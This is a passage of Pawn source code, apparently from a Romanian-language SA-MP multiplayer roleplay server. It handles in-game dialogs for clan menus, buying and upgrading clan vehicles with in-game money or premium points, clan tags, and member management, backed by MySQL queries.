			if(GetPlayerCash(playerid) < CarInfo[vsid][cTax]*points) return SendErrorMsg(playerid, "Nu ai suma necesara pentru a cumpara puncte de asigurare!");

			CarInfo[vsid][cPoints] += points;
			va_SendClientMessage(playerid, COLOR_MONEY, "Ai platit $%s pentru %d puncte asigurare.", FormatNumber(CarInfo[vsid][cTax]*points), points);
			GivePlayerCash(playerid, -CarInfo[vsid][cTax]*points);
			_query("UPDATE `cars` SET `Points`='%d' WHERE `ID`='%d'", CarInfo[vsid][cPoints], CarInfo[vsid][cID]);
		}
		case DIALOG_CLANTURFS: {
			if(!response) return true;
			if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
			new i;
			i = listitem+1;
			SetPlayerCheckpoint(playerid, GraffitiInfo[i][gfX], GraffitiInfo[i][gfY], GraffitiInfo[i][gfZ]-3, 5.0);
			SendClientMessage(playerid, COLOR_YELLOW, "Server-ul ti-a pus un punct rosu catre locatia aleasa de tine.");
			CP[playerid] = 53;
		}
		case DIALOG_CLAN_COMMAND: {
			if(!response) return true;
			new clanid = PlayerInfo[playerid][pClan];
			switch(listitem) {
				case 0: {
					listitemm[playerid] = 0;
					mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `users`.`Clan` = '%d' ORDER BY `users`.`ClanRank` DESC LIMIT %d", clanid, ClanInfo[clanid][clSlots]);
					mysql_tquery(SQL, gQuery, "SQL_CLAN_FIRST", "ii", playerid, clanid);
				}
				case 1: {
					format(gString, 128, "{FFF785}%s{FFFFFF}%s\n%s{FFF785}%s{FFFFFF}\nRemove clan TAG", ClanInfo[clanid][clTag], GetName(playerid), GetName(playerid), ClanInfo[clanid][clTag]);		
					ShowPlayerDialog(playerid, DIALOG_CLANTAG, DIALOG_STYLE_LIST , "{F4AD42}Clan {FFFFFF}TAG", gString, "Ok", "Close");					
				}
				case 2: ShowPlayerClanVehicle(playerid);
				case 3: {
					format(gString, sizeof gString, "Pentru a depune bani in seif este necesar sa muncesti la unul din joburile de pe server\n%d%% din bani castigati de tine vor intra automat in seif (tu nu vei pierde nimic).\nAcesti bani pot fi folositi pentru achiztionarea de noi vehicule sau pentru alte lucruri folositoare clanului.\n\nMoney: {009900}$%s\n{A9C4E4}Premium Points: {FF0000}%d", ClanInfo[clanid][clBonus], FormatNumber(ClanInfo[clanid][ClanBank]), ClanInfo[clanid][clPremiumPoints]);
					ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "{F4AD42}Clan {FFFFFF}Safebox", gString, "ok", "");
				}
				case 4: {
					format(gString, sizeof gString, "Change color\nChange MOTD\nChange rank names\nChange Tag {f0f060}(200 premium points)\n{FFFFFF}Change Name {f0f060}(200 premium points)\n{FFFFFF}+30 Clan slots {f0f060}(50 premium points)\n{FFFFFF}Clan days {009900}($10,000,000/days)\n{FFFFFF}Clan bonus procent - current: %d%s/%d%s {f0f060}(1000 premium points / 10%s)\n{FFFFFF}Clan Premium {f0f060}(1500 premium points)\n{FFFFFF}Clan VIP {f0f060}(3000 premium points)", ClanInfo[clanid][clBonus] * 10, "%", ClanInfo[clanid][clVip]?120:90, "%", "%");
					ShowPlayerDialog(playerid, DIALOG_CLAN_SETTINGS, DIALOG_STYLE_LIST, "{F4AD42}Clan {FFFFFF}Settings", gString, "Select", "Back");
				}
			}
		}
		case DIALOG_DEPOSITPP: {
			if(!response) return 1;
			new pp = strval(inputtext), clanid = PlayerInfo[playerid][pClan];
			if(strval(inputtext) <= 0 || strval(inputtext) > 1000)
				return SendClientMessage(playerid, -1, "Suma invalida!");

			if(PlayerInfo[playerid][pPremiumPoints] < pp) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai suficiente puncte premium!");
			ClanInfo[clanid][clPremiumPoints] += pp;
			PlayerInfo[playerid][pPremiumPoints] -= pp;
			PlayerInfo[playerid][pClanPP] += pp;
			UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
			mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `ClanPP` = `ClanPP` + '%i' WHERE `id` = '%i'", pp, PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL, gQuery);
			mysql_format(SQL, gQuery, 128, "UPDATE `clans` SET `PremiumPoints`='%i' WHERE `ID`='%i'", ClanInfo[clanid][clPremiumPoints], ClanInfo[clanid][cID]);
			mysql_tquery(SQL, gQuery, "", "");
			format(gString, 128, "{f7da5b}>> %s has deposited %d premium points in the clan safebox. Total: %d <<", GetName(playerid), pp, ClanInfo[clanid][clPremiumPoints]);
			SendClanMessage(clanid, gString);
		}
		case DIALOG_CLANBUY: {
			if(!response)
				return true;
			new clanid = PlayerInfo[playerid][pClan];

			if(PlayerInfo[playerid][pClanRank] < 7)
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de rank 7 pentru a accesa acest meniu!");

			if(ClanInfo[clanid][clPremium]!=1&&Iter_Count(MyVehicle<PlayerInfo[playerid][pClan]+MAX_PLAYERS>)>=10)
				SendClientMessage(playerid, COLOR_LGREEN, "EROARE: Nu poti avea mai mult de 10 vehicule la clan.");
			else if(ClanInfo[clanid][clPremium]==1&&Iter_Count(MyVehicle<PlayerInfo[playerid][pClan]+MAX_PLAYERS>)>=20)
				SendClientMessage(playerid, COLOR_LGREEN, "EROARE: Nu poti avea mai mult de 20 vehicule la clan.");

			switch(listitem) {
				case 0: {
					if(ClanInfo[clanid][ClanBank] < 185000000)
						return SendClientMessage(playerid, COLOR_GREY, "Nu ai suma necesara de bani!");

					ClanInfo[clanid][ClanBank] -= 185000000;

					mysql_tquery(SQL, "INSERT INTO clanvehicle (Model) VALUES (560)", "InsertClanVehicle", "iii", clanid, 560, 185000000);
					format(gString, 128, "{%s}[CLAN] %s a cumparat vehiculul Sultan pentru clan (-$185.000.000, total: $%s).", ClanInfo[clanid][clColor], GetName(playerid), FormatNumber(ClanInfo[clanid][ClanBank]));
				}
				case 1: {
					if(ClanInfo[clanid][ClanBank] < 300000000)
						return SendClientMessage(playerid, COLOR_GREY, "Nu ai suma necesara de bani!");

					ClanInfo[clanid][ClanBank] -= 300000000;

					mysql_tquery(SQL, "INSERT INTO clanvehicle (Model) VALUES (411)", "InsertClanVehicle", "iii", clanid, 411, 300000000);
					format(gString, 128, "{%s}[CLAN] %s a cumparat vehiculul Infernus pentru clan (-$300.000.000, total: $%s).", ClanInfo[clanid][clColor], GetName(playerid), FormatNumber(ClanInfo[clanid][ClanBank]));
				}
				case 2: {
					if(ClanInfo[clanid][ClanBank] < 120000000)
						return SendClientMessage(playerid, COLOR_GREY, "Nu ai suma necesara de bani!");

					ClanInfo[clanid][ClanBank] -= 120000000;

					mysql_tquery(SQL, "INSERT INTO clanvehicle (Model) VALUES (495)", "InsertClanVehicle", "iii", clanid, 495, 120000000);
					format(gString, 128, "{%s}[CLAN] %s a cumparat vehiculul Sandking pentru clan (-$120.000.000, total: $%s).", ClanInfo[clanid][clColor], GetName(playerid), FormatNumber(ClanInfo[clanid][ClanBank]));
				}
				case 3: {
					if(ClanInfo[clanid][ClanBank] < 160000000)
						return SendClientMessage(playerid, COLOR_GREY, "Nu ai suma necesara de bani!");

					ClanInfo[clanid][ClanBank] -= 160000000;

					mysql_tquery(SQL, "INSERT INTO clanvehicle (Model) VALUES (579)", "InsertClanVehicle", "iii", clanid, 579, 160000000);
					format(gString, 128, "{%s}[CLAN] %s a cumparat vehiculul Huntley pentru clan (-$160.000.000, total: $%s).", ClanInfo[clanid][clColor], GetName(playerid), FormatNumber(ClanInfo[clanid][ClanBank]));
				}
				case 4: {
					if(ClanInfo[clanid][ClanBank] < 150000000)
						return SendClientMessage(playerid, COLOR_GREY, "Nu ai suma necesara de bani!");

					ClanInfo[clanid][ClanBank] -= 150000000;

					mysql_tquery(SQL, "INSERT INTO clanvehicle (Model) VALUES (482)", "InsertClanVehicle", "iii", clanid, 482, 150000000);
					format(gString, 128, "{%s}[CLAN] %s a cumparat vehiculul Burrito pentru clan (-$150.000.000, total: $%s).", ClanInfo[clanid][clColor], GetName(playerid), FormatNumber(ClanInfo[clanid][ClanBank]));
				}
				case 5: {
					if(ClanInfo[clanid][ClanBank] < 200000000)
						return SendClientMessage(playerid, COLOR_GREY, "Nu ai suma necesara de bani!");

					ClanInfo[clanid][ClanBank] -= 200000000;

					mysql_tquery(SQL, "INSERT INTO clanvehicle (Model) VALUES (480)", "InsertClanVehicle", "iii", clanid, 480, 200000000);
					format(gString, 128, "{%s}[CLAN] %s a cumparat vehiculul Comet pentru clan (-$200.000.000, total: $%s).", ClanInfo[clanid][clColor], GetName(playerid), FormatNumber(ClanInfo[clanid][ClanBank]));
				}
				case 6: {
					if(ClanInfo[clanid][clPremiumPoints] < 400)
						return SendClientMessage(playerid, COLOR_GREY, "Nu ai suma necesara de puncte premium!");

					ClanInfo[clanid][clPremiumPoints] -= 400;

					mysql_tquery(SQL, "INSERT INTO clanvehicle (Model) VALUES (502)", "InsertClanVehicle", "iii", clanid, 502, 0);
					format(gString, 128, "{%s}[CLAN] %s a cumparat vehiculul Hotring Racer A pentru clan (-400PP, total: %sPP).", ClanInfo[clanid][clColor], GetName(playerid), FormatNumber(ClanInfo[clanid][clPremiumPoints]));
				}
				case 7: {
					if(ClanInfo[clanid][clPremiumPoints] < 400)
						return SendClientMessage(playerid, COLOR_GREY, "Nu ai suma necesara de puncte premium!");

					ClanInfo[clanid][clPremiumPoints] -= 400;

					mysql_tquery(SQL, "INSERT INTO clanvehicle (Model) VALUES (503)", "InsertClanVehicle", "iii", clanid, 503, 0);
					format(gString, 128, "{%s}[CLAN] %s a cumparat vehiculul Hotring Racer B pentru clan (-400PP, total: %sPP).", ClanInfo[clanid][clColor], GetName(playerid), FormatNumber(ClanInfo[clanid][clPremiumPoints]));
				}
				case 8: {
					if(ClanInfo[clanid][clPremiumPoints] < 400)
						return SendClientMessage(playerid, COLOR_GREY, "Nu ai suma necesara de puncte premium!");

					ClanInfo[clanid][clPremiumPoints] -= 400;

					mysql_tquery(SQL, "INSERT INTO clanvehicle (Model) VALUES (494)", "InsertClanVehicle", "iii", clanid, 494, 0);
					format(gString, 128, "{%s}[CLAN] %s a cumparat vehiculul Hotring Racer C pentru clan (-400PP, total: %sPP).", ClanInfo[clanid][clColor], GetName(playerid), FormatNumber(ClanInfo[clanid][clPremiumPoints]));
				}
				case 9: {
					if(ClanInfo[clanid][clPremiumPoints] < 450)
						return SendClientMessage(playerid, COLOR_GREY, "Nu ai suma necesara de puncte premium!");

					ClanInfo[clanid][clPremiumPoints] -= 450;

					mysql_tquery(SQL, "INSERT INTO clanvehicle (Model) VALUES (409)", "InsertClanVehicle", "iii", clanid, 409, 0);
					format(gString, 128, "{%s}[CLAN] %s a cumparat vehiculul Stretch pentru clan (-450PP, total: %sPP).", ClanInfo[clanid][clColor], GetName(playerid), FormatNumber(ClanInfo[clanid][clPremiumPoints]));
				}
				case 10: {
					if(ClanInfo[clanid][clPremiumPoints] < 1500)
						return SendClientMessage(playerid, COLOR_GREY, "Nu ai suma necesara de puncte premium!");

					ClanInfo[clanid][clPremiumPoints] -= 1500;

					mysql_tquery(SQL, "INSERT INTO clanvehicle (Model) VALUES (541)", "InsertClanVehicle", "iii", clanid, 541, 0);
					format(gString, 128, "{%s}[CLAN] %s a cumparat vehiculul Bullet pentru clan (-1500PP, total: %sPP).", ClanInfo[clanid][clColor], GetName(playerid), FormatNumber(ClanInfo[clanid][clPremiumPoints]));
				}
				case 11: {
					if(ClanInfo[clanid][clPremiumPoints] < 10000)
						return SendClientMessage(playerid, COLOR_GREY, "Nu ai suma necesara de puncte premium!");

					ClanInfo[clanid][clPremiumPoints] -= 10000;

					mysql_tquery(SQL, "INSERT INTO clanvehicle (Model) VALUES (556)", "InsertClanVehicle", "iii", clanid, 556, 0);
					format(gString, 128, "{%s}[CLAN] %s a cumparat vehiculul Monster pentru clan (-10000PP, total: %sPP).", ClanInfo[clanid][clColor], GetName(playerid), FormatNumber(ClanInfo[clanid][clPremiumPoints]));
				}
				case 12: {
					if(ClanInfo[clanid][clPremiumPoints] < 500)
						return SendClientMessage(playerid, COLOR_GREY, "Nu ai suma necesara de puncte premium!");

					ClanInfo[clanid][clPremiumPoints] -= 500;

					mysql_tquery(SQL, "INSERT INTO clanvehicle (Model) VALUES (522)", "InsertClanVehicle", "iii", clanid, 522, 0);
					format(gString, 128, "{%s}[CLAN] %s a cumparat vehiculul NRG-500 pentru clan (-500PP, total: %sPP).", ClanInfo[clanid][clColor], GetName(playerid), FormatNumber(ClanInfo[clanid][clPremiumPoints]));
				}
				case 13: {
					if(ClanInfo[clanid][clPremiumPoints] < 1000)
						return SendClientMessage(playerid, COLOR_GREY, "Nu ai suma necesara de puncte premium!");

					ClanInfo[clanid][clPremiumPoints] -= 1000;

					mysql_tquery(SQL, "INSERT INTO clanvehicle (Model) VALUES (487)", "InsertClanVehicle", "iii", clanid, 487, 0);
					format(gString, 128, "{%s}[CLAN] %s a cumparat vehiculul Maverick pentru clan (-1000PP, total: %sPP).", ClanInfo[clanid][clColor], GetName(playerid), FormatNumber(ClanInfo[clanid][clPremiumPoints]));
				}
			}
			SendClanMessage(clanid, gString);
			mysql_format(SQL, gQuery, 128, "UPDATE `clans` SET `PremiumPoints` = '%i', `Safebox` = '%i' WHERE `ID` = '%i'", ClanInfo[clanid][clPremiumPoints], ClanInfo[clanid][ClanBank], ClanInfo[clanid][cID]);
			mysql_tquery(SQL, gQuery);
		}
		case DIALOG_CLANVEHICLES: {
			if(!response) return true;
			if(!listitem) return ShowPlayerDialog(playerid, DIALOG_CLANBUY, DIALOG_STYLE_TABLIST_HEADERS, "{F4AD42}Clan {FFFFFF}Vehicles", "Vehicul\tPret\n\
			Sultan\t$185,000,000\nInfernus\t$300,000,000\nSandking\t$120,000,000\nHuntley\t$160,000,000\nBurrito\t$150,000,000\nComet\t$200,000,000\nHotring Racer A\t400PP\n\
			Hotring Racer B\t400PP\nHotring Racer C\t400PP\nStretch\t450PP\nBullet\t1500PP\nMonster\t10000PP\nNRG-500\t500PP\nMaverick\t1000PP", "Buy", "Cancel");
			listitemm[playerid] = listitem-1;
			new idd = PlayerInfo[playerid][pCarKey][listitem-1];
			if(!CarInfo[idd][cVip]) ShowPlayerDialog(playerid, DIALOG_CLANVEHICLES1, DIALOG_STYLE_LIST, "Manage Vehicles", "Set vehicle rank\nSell vehicle\nSpawn or Despawn vehicle\nFind vehicle\nDebug vehicle\nUpgrade to Rainbow Vehicle {FFFF00}(300 premium points)\n{FFFFFF}Upgrade to VIP Plus {FFFF00}(500 premium points)", "Select", "Cancel");
			else ShowPlayerDialog(playerid, DIALOG_CLANVEHICLES1, DIALOG_STYLE_LIST, "Manage Vehicles", "Set vehicle rank\nSell vehicle\nSpawn or Despawn vehicle\nFind vehicle\nDebug vehicle\nUpgrade to Rainbow Vehicle {FFFF00}(300 premium points)\nUpgrade to VIP Plus {FFFF00}(500 premium points)\n{FF0000}>> {FFFFFF}Teleport Vehicle", "Select", "Cancel");
		}
		case DIALOG_CLANVEHICLES1: {
			if(!response) return true;
			new idd = PlayerInfo[playerid][pCarKey][listitemm[playerid]];
			listitemmm[playerid] = idd;
			debugClanVehicle[playerid] = idd;
			switch(listitem) {
				case 0: { 
					if(PlayerInfo[playerid][pClanRank]<6)
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de rank 6+ pentru a accesa acest meniu!");

					ShowPlayerDialog(playerid, DIALOG_CLANVRANK, DIALOG_STYLE_INPUT, "Seteaza rank", "- Pune rank-ul dorit.", "Select", "Cancel");
				}
				case 1: {
					if(PlayerInfo[playerid][pClanRank]<7)
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de rank 7+ pentru a accesa acest meniu!");

					format(gString, 128, "Esti sigur ca vrei sa vinzi vehiculul de la clan?\n Vei primi 50%s din valoarea lui.", "%");
					ShowPlayerDialog(playerid, DIALOG_SELLCLANV, DIALOG_STYLE_MSGBOX, "Vinde vehicul", gString, "Select", "Cancel");
				}
				case 2: {
					if(PlayerInfo[playerid][pClanRank]<CarInfo[idd][cRank])
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta optiune pe acel vehicul deoarece rank-ul vehiculului este mai mare fata de al tau.");

					if(IsVehicleOccupied(CarInfo[idd][Spawned]))
						return SendClientMessage(playerid, COLOR_LGREEN, "This vehicle is occupied.");

					if(!CarInfo[idd][Spawned]) {
						if(ClanInfo[PlayerInfo[playerid][pClan]][clPremium]!=1&&ClanSpawn[PlayerInfo[playerid][pClan]]>=6) return SendClientMessage(playerid, COLOR_GREY, "Error: {FFFFFF}You can not spawn more than 6 clan vehicles!");
						else if(ClanInfo[PlayerInfo[playerid][pClan]][clPremium]==1&&ClanSpawn[PlayerInfo[playerid][pClan]]>=12) return SendClientMessage(playerid, COLOR_GREY, "Error: {FFFFFF}You can not spawn more than 12 clan vehicles!");
						SpawnClanCar(idd);
						format(gString, 128, "{%s}[CLAN] %s a spawnat vehiculul %s (rank: %d).", ClanInfo[CarInfo[idd][cClan]][clColor], GetName(playerid), GetVehicleName(CarInfo[idd][cModel]), CarInfo[idd][cRank]);
					} else {
						DestroyClanVehicle(idd);
						format(gString, 128, "{%s}[CLAN] %s a despawnat vehiculul %s (rank: %d).", ClanInfo[CarInfo[idd][cClan]][clColor], GetName(playerid), GetVehicleName(CarInfo[idd][cModel]), CarInfo[idd][cRank]);
					}
					SendClanMessage(CarInfo[idd][cClan], gString);
				}
				case 3: {
					if(!CarInfo[idd][Spawned])
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest vehicul nu este spawnat.");
					if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");

					new Float:x,Float:y,Float:z;
					GetVehiclePos(CarInfo[idd][Spawned], x, y, z);
					SetPlayerCheckpoint(playerid, x, y, z, 5.0);
					CP[playerid] = 53;

					SendClientMessage(playerid, COLOR_YELLOW, "Vehicul localizat! Du-te la checkpoint-ul de pe mapa.");
				}
				case 4: {
					if(!CarInfo[idd][Spawned])
						return SendClientMessage(playerid, COLOR_LGREEN, "Eraore: Acest vehicul nu este spawnat.");

					if(IsVehicleOccupied(CarInfo[idd][Spawned]))
						return SendClientMessage(playerid, COLOR_LGREEN, "This vehicle is occupied.");

					if(CP[playerid] != 0 || targetfind[playerid] != -1) 
						return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");			
					
					SendClientMessage(playerid, COLOR_YELLOW, "Checkpoint marked at the location in 3 seconds..");
					DebugClanVehicleTimer[playerid] = 3;
				}
				case 5: {
					if(!CarInfo[idd][Spawned]) 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel vehicul nu este spawnat!");

					if(CarInfo[idd][cRainBow]) 
						return SendClientMessage(playerid, -1, "Acest vehicul este deja upgradat la aceasta optiune!");

					if(ClanInfo[CarInfo[idd][cClan]][clPremiumPoints] < 300) 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Clanul tau nu detine 300 PP!");

					ShowPlayerDialog(playerid, DIALOG_CLANRAINBOW, DIALOG_STYLE_MSGBOX, "Rainbow Clan Vehicle", "Esti sigur ca vrei sa faci acest lucru?", "Da", "Nu");
				}
				case 6: {
					if(!CarInfo[idd][Spawned]) 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest vehicul nu este spawnat!");

					if(CarInfo[idd][cVip]) 
						return SendClientMessage(playerid, -1, "Acest vehicul este deja upgradat la aceasta optiune!");

					if(ClanInfo[CarInfo[idd][cClan]][clPremiumPoints] < 500) 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Clanul tau nu detine 500 PP!");

					ShowPlayerDialog(playerid, DIALOG_CLANVP, DIALOG_STYLE_MSGBOX, "VIP Plus Clan Vehicle", "Esti sigur ca vrei sa faci acest lucru?", "Da", "Nu");
				}
				case 7: {
					if(CarInfo[idd][Spawned] == 0) 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este spawnat!");

					if(IsVehicleOccupied(CarInfo[idd][Spawned])) 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau este ocupat!");

					if(gettime() < CarInfo[idd][cTimeGoto])
						return SCMf(playerid, COLOR_LGREEN, "You can't use this option for %d minutes and %d seconds.", (CarInfo[idd][cTimeGoto]-gettime())/60, (CarInfo[idd][cTimeGoto]-gettime())%60);
					
					if(IsAttached(CarInfo[idd][Spawned])) 
	        			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta functie momentan!");

	        		if(GetPlayerVirtualWorld(playerid) != 0 || GetPlayerInterior(playerid) != 0) 
                    	return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta optiune intr-un VW / Interior diferit de 0.");

					new Float: X, Float: Y, Float: Z;
					GetPlayerPos(playerid, X, Y, Z);
					SetVehiclePosEx(CarInfo[idd][Spawned], X, Y+4, Z);
					SetVehicleVirtualWorld(CarInfo[idd][Spawned], GetPlayerVirtualWorld(playerid));
					LinkVehicleToInterior(CarInfo[idd][Spawned], GetPlayerInterior(playerid));
					SendClientMessage(playerid, COLOR_MONEY, "(VIP Plus) {FFFFFF}You called the clan mechanic, please wait..");
					CarInfo[idd][cTimeGoto] = gettime()+900;
					format(gString, 128, "{%s}[CLAN] %s a teleportat vehiculul %s (rank: %d) la el.", ClanInfo[PlayerInfo[playerid][pClan]][clColor], GetName(playerid), GetVehicleName(CarInfo[idd][cModel]), CarInfo[idd][cRank]);
				    SendClanMessage(PlayerInfo[playerid][pClan], gString);
				}
			}
		}
		case DIALOG_CLANVP: {
			if(!response)
				return true;

			new idd = listitemmm[playerid];
			if(!CarInfo[idd][Spawned]) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel vehicul nu este spawnat!");

			if(CarInfo[idd][cVip]) 
				return SendClientMessage(playerid, -1, "Acest vehicul este deja upgradat la aceasta optiune!");

			new clan=CarInfo[idd][cClan];
			if(ClanInfo[CarInfo[idd][cClan]][clPremiumPoints] < 500) return SendClientMessage(playerid, -1, "Eroare: Clanul tau nu detine 500 PP!");
			ClanInfo[CarInfo[idd][cClan]][clPremiumPoints] -= 500;
			CarInfo[idd][cVip] = true;
			SendClientMessage(playerid, COLOR_YELLOW, "* Felicitari! Ai achizitionat optiunea VIP Plus. -500PP");
			_query("UPDATE `clans` SET `PremiumPoints` = '%i' WHERE `ID` = '%i'", ClanInfo[clan][clPremiumPoints], ClanInfo[clan][cID]);
			_query("UPDATE `clanvehicle` SET `VIP`='%d' WHERE `ID`='%d'", CarInfo[idd][cVip], CarInfo[idd][cID]);
		}
		case DIALOG_CLANRAINBOW: {
			if(!response) return true;
			new idd = listitemmm[playerid];
			if(!CarInfo[idd][Spawned]) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel vehicul nu este spawnat!");

			if(CarInfo[idd][cRainBow]) 
				return SendClientMessage(playerid, -1, "Acest vehicul este deja upgradat la aceasta optiune!");

			if(ClanInfo[CarInfo[idd][cClan]][clPremiumPoints] < 300) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Clanul tau nu detine 300 PP!");
			ClanInfo[CarInfo[idd][cClan]][clPremiumPoints] -= 300;
			SendClientMessage(playerid, COLOR_YELLOW, "* Felicitari! Ai achizitionat optiunea rainbow. -300PP");
			CarInfo[idd][cRainBow] = true;
			_query("UPDATE `clans` SET `PremiumPoints` = '%i' WHERE `ID` = '%i'", ClanInfo[CarInfo[idd][cClan]][clPremiumPoints], ClanInfo[CarInfo[idd][cClan]][cID]);
			_query("UPDATE `clanvehicle` SET `RainBow`='%d' WHERE `ID`='%d'", CarInfo[idd][cRainBow], CarInfo[idd][cID]);
		}
		case DIALOG_CLANVRANK: {
			if(!response)
				return true;

			new rank = strval(inputtext),idd=PlayerInfo[playerid][pCarKey][listitemm[playerid]];
			if(rank <= 0 || rank >= 7)
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Rank minim 1 - Rank maxim 7!");

			CarInfo[idd][cRank] = rank;
			SCMf(playerid, COLOR_LGREEN, "Ai schimbat cu succes rank-ul necesar al acestui vehicul in: %d.", rank);
			mysql_format(SQL, gQuery, 128, "UPDATE `clanvehicle` SET `Rank` = '%i' WHERE `ID` = '%i'", rank, CarInfo[idd][cID]);
			mysql_tquery(SQL, gQuery);
		}
		case DIALOG_SELLCLANV: {
			if(!response) return true;
			new idd = PlayerInfo[playerid][pCarKey][listitemm[playerid]];
			if(!CarInfo[idd][Spawned]) return true;
						
			new value = CarInfo[idd][cValue] / 2;

			GivePlayerCash(playerid, value);
			SendClientMessage(playerid, COLOR_LGREEN, "Vehicul vandut!");
						
			DestroyClanVehicle(idd);
			Iter_Remove(MyVehicle<CarInfo[idd][cClan]+MAX_PLAYERS>, idd);
			mysql_format(SQL, gQuery, sizeof(gQuery), "DELETE FROM `clanvehicle` WHERE `ID`='%d' LIMIT 1", CarInfo[idd][cID]);
			mysql_tquery(SQL, gQuery, "", "");
		}
		case DIALOG_CLANTAG: {
			if(!response) return true;
			if(listitem == 2) {
				PlayerInfo[playerid][pTag] = -1;
				UpdateVar(playerid, "Tag", -1);
				SendClientMessage(playerid, COLOR_LGREEN, "Ti-ai scos tagul!");
				SetPlayerName(playerid, PlayerInfo[playerid][pUsername]);
				mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `Tag` = '-1', `name_and_tag` = '%s' WHERE `id` = '%i'", PlayerInfo[playerid][pUsername], PlayerInfo[playerid][pSQLID]);
				mysql_tquery(SQL, gQuery);
				return true;
			}
			new clanid = PlayerInfo[playerid][pClan];
			if(strlen(PlayerInfo[playerid][pUsername])+strlen(ClanInfo[clanid][clTag]) >= MAX_PLAYER_NAME) return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti pune tag din cauza nickname-ul tau prea mare!");
			PlayerInfo[playerid][pTag] = listitem;
			SendClientMessage(playerid, COLOR_LGREEN, "Pozitia TAG-ului a fost modificata!");
			switch(PlayerInfo[playerid][pTag]) {
				case 0: format(gString, 60, "%s%s", ClanInfo[clanid][clTag], PlayerInfo[playerid][pUsername]), mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `Tag` = '0', `name_and_tag` = '%s%s' WHERE `id` = '%i'", ClanInfo[clanid][clTag], PlayerInfo[playerid][pUsername], PlayerInfo[playerid][pSQLID]);
				case 1: format(gString, 60, "%s%s", PlayerInfo[playerid][pUsername], ClanInfo[clanid][clTag]), mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `Tag` = '1', `name_and_tag` = '%s%s' WHERE `id` = '%i'", PlayerInfo[playerid][pUsername], ClanInfo[clanid][clTag], PlayerInfo[playerid][pSQLID]);
			}
			mysql_tquery(SQL, gQuery);
			SetPlayerName(playerid, gString);	
		}	
		case DIALOG_CLAN_MEMBERS: {
			if(!response) return ShowPlayerDialog(playerid, DIALOG_CLAN_COMMAND, DIALOG_STYLE_LIST, "{F4AD42}Clan {FFFFFF}Menu", "Members\nClan TAG\nVehicles\nSafebox\nSettings", "Select", "Close");
		    if(PlayerInfo[playerid][pClanRank] < 7) return SendClientMessage(playerid, COLOR_WHITE, "La aceasta categorie, are acces doar propietarul clanului.");
          	if(listitem==listitemmm[playerid]+1) return true;
          	if(listitem==listitemmm[playerid]) {
          		mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `users`.`Clan` = '%d' ORDER BY `users`.`ClanRank` DESC LIMIT %d, 30", PlayerInfo[playerid][pClan], listitemm[playerid]*30);
				mysql_tquery(SQL, gQuery, "SQL_CLAN_FRESH", "ii", playerid, PlayerInfo[playerid][pClan]);
				listitemm[playerid]++;
				return true;
          	}
      		listitemm[playerid] = listitem;
      		format(sName[playerid], MAX_PLAYER_NAME, Selected[playerid][listitem]);	
      		mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name`='%s'", sName[playerid]);
			mysql_tquery(SQL, gQuery, "cache_clan_manage_members", "i", playerid);
		}
		case DIALOG_CLAN_MANAGE2: {
			if(!response) return true;
			new clanid = PlayerInfo[playerid][pClan], i = listitemm[playerid], userID=SelectedPlayers[playerid][i];
			strmid(sName[playerid], Selected[playerid][i], 0, MAX_PLAYER_NAME);
			if(SelectedPlayers[playerid][i]==playerid) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!"); 
			switch(listitem) {
			    case 0: {
			    	if(PlayerInfo[playerid][pClanAccess][1] != 1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai accesul necesar pentru a putea face asta.");
					format(gString, 128, "Ai fost dat afara din clanul %s de %s.", ClanInfo[clanid][clName], GetName(playerid));
					InsertEmail(Selected[playerid][i], GetName(playerid), gString);					
			        if(userID != -1) {
		  				SCMf(userID, COLOR_LIGHTBLUE, "Ai fost dat afara din clan de catre %s.", GetName(playerid));
						Iter_Remove(clan_players<PlayerInfo[userID][pClan]>, userID);
						PlayerInfo[userID][pClan] = 0;
						PlayerInfo[userID][pClanRank] = 0;
						PlayerInfo[userID][pClanDays] = 0;
						PlayerInfo[userID][pClanWarn] = 0;
						format(gString, 128, "{%s}[CLAN] %s l-a dat pe %s afara.", ClanInfo[clanid][clColor], GetName(playerid), Selected[playerid][i]);
